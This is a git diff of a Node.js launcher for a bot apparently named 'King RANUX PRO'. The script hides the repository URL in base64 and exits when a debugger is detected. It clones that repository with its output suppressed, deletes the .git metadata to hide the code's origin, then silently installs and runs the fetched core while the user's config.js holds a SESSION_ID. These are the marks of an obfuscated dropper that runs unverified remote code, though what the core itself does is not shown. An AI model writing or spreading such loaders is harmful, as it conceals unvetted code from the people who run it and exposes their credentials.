@@ -2,11 +2,13 @@ const { execSync } = require("child_process");
 const fs = require("fs");
 const path = require("path");
 
+// Anti debug
 if (process.execArgv.join("").includes("inspect")) {
-  console.log("Debug mode detected. Exiting...");
+  console.log("❌ Debug mode detected. Exiting...");
   process.exit(1);
 }
 
+// Decode core url (double encoded base64)
 const CORE_URL = Buffer.from(
   "aHR0cHM6Ly9naXRodWIuY29tL3J4YnJpZGdlLWRldi9ueC1icmlkZ2UuZ2l0",
   "base64"
@@ -14,60 +16,79 @@ const CORE_URL = Buffer.from(
 
 const CORE_DIR = path.join(__dirname, "core");
 
-try {
-  console.log("Clearing npm cache...");
-  execSync("npm cache clean --force", { stdio: "inherit" });
-} catch {}
-
-if (fs.existsSync(CORE_DIR)) {
-  try {
-    console.log("Removing old core...");
-    fs.rmSync(CORE_DIR, { recursive: true, force: true });
-  } catch {}
+function log(msg) {
+  console.log(msg);
 }
 
-console.log("Downloading latest King RANUX PRO core...");
-console.log("Repo:", CORE_URL);
+log("");
+log("👑 KING RANUX PRO BOT");
+log("━━━━━━━━━━━━━━━━━━━━━━");
+log("🔐 Secure Core Loader");
+log("");
 
+// Clear npm cache
 try {
-  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
-  console.log("Core downloaded.");
+  log("🧹 Clearing npm cache...");
+  execSync("npm cache clean --force", { stdio: "ignore" });
+} catch {}
+
+// Remove old core
+if (fs.existsSync(CORE_DIR)) {
+  try {
+    log("♻️ Old core found. Removing...");
+    fs.rmSync(CORE_DIR, { recursive: true, force: true });
+    log("✅ Old core removed.");
+  } catch {
+    log("⚠️ Failed to remove old core.");
+  }
+}
+
+// Download core
+log("📥 Downloading latest King RANUX PRO core...");
+try {
+  execSync(`git clone ${CORE_URL} core`, { stdio: "ignore" });
+  log("✅ Core downloaded successfully.");
 } catch (e) {
-  console.log("Failed to download core.");
+  log("❌ Failed to download core.");
   process.exit(1);
 }
 
+// Remove git metadata
 if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
   try {
     fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
+    log("🕵️ Core origin hidden.");
   } catch {}
 }
 
+// Install dependencies
 if (!fs.existsSync(path.join(CORE_DIR, "node_modules"))) {
   try {
-    console.log("Installing core dependencies...");
-    execSync(`cd core && npm install`, { stdio: "inherit" });
-  } catch (e) {
-    console.log("Failed to install core dependencies.");
+    log("📦 Installing core dependencies...");
+    execSync("cd core && npm install", { stdio: "ignore" });
+    log("✅ Dependencies installed.");
+  } catch {
+    log("❌ Failed to install dependencies.");
     process.exit(1);
   }
 }
 
+// Check user config
 const userConfigPath = path.join(__dirname, "config.js");
 
 if (!fs.existsSync(userConfigPath)) {
-  console.log("config.js not found.");
-  console.log("Please create config.js with your SESSION_ID.");
+  log("❌ config.js not found!");
+  log("👉 Please create config.js with your SESSION_ID.");
   process.exit(1);
 }
 
-console.log("KING RANUX PRO BOT");
-console.log("Secure Core Loader");
-console.log("Launching...");
+log("");
+log("🚀 Launching King RANUX PRO...");
+log("━━━━━━━━━━━━━━━━━━━━━━");
 
 try {
   require("./core/index.js");
 } catch (e) {
-  console.log("Failed to start core.");
+  log("❌ Failed to start core.");
   console.log(e);
 }
